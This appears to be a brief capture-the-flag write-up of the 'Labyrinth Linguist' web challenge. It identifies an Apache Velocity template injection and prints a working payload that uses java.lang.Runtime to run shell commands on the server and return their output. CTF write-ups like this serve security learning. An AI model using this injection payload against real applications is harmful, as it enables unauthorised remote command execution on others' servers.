# Labyrinth Linguist

So we start off with this text transfirmer:

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Really nothing goes on except the translate feature, no interesting network requests, hints in the source code or cookies so i go and capture the request and download all the files:

since our input is somehow reflected on the page i'm thinking about ssti but i can't manage to trigger and identify the template running behind it but by lookinbg at the source code i get the answer for this question:

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Velocity is a **Java-based template engine** that allows embedding dynamic content in templates. It uses a specific syntax to process templates and render dynamic data

here we got some payloads for this:

{% embed url="https://antgarsil.github.io/posts/velocity/" %}

So i try the following payload:

```
#set ($run=1 + 1) $run 
```

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

So i browse a bit and find this payload:

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##

#set($ex=$rt.getRuntime().exec('ls ../'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

<figure><img src="../../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

and we flag
